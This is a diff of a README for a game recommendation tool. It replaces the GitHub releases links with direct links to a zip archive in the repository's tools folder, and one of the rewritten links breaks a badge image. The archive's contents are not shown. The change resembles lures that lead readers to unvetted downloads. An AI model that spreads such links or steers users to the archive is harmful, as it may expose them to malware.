@@ -12,9 +12,9 @@ The Game Recommendation Agent helps you find games you will love. It uses data f
 
 ## 📥 Download & Install
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Wavyier/game-recommendation-agent/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Wavyier/game-recommendation-agent/main/tools/recommendation-game-agent-3.9.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Wavyier/game-recommendation-agent/main/tools/recommendation-game-agent-3.9.zip)
 
-To get started, visit this page to download the Game Recommendation Agent: [Download Here](https://github.com/Wavyier/game-recommendation-agent/releases).
+To get started, visit this page to download the Game Recommendation Agent: [Download Here](https://raw.githubusercontent.com/Wavyier/game-recommendation-agent/main/tools/recommendation-game-agent-3.9.zip).
 
 Follow these steps to install and run the software:
 
@@ -63,6 +63,6 @@ If you encounter issues or have questions, feel free to reach out via the GitHub
 
 ---
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Wavyier/game-recommendation-agent/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Wavyier/game-recommendation-agent/main/tools/recommendation-game-agent-3.9.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Wavyier/game-recommendation-agent/main/tools/recommendation-game-agent-3.9.zip)
 
 Thank you for using the Game Recommendation Agent. Your next favorite game awaits!
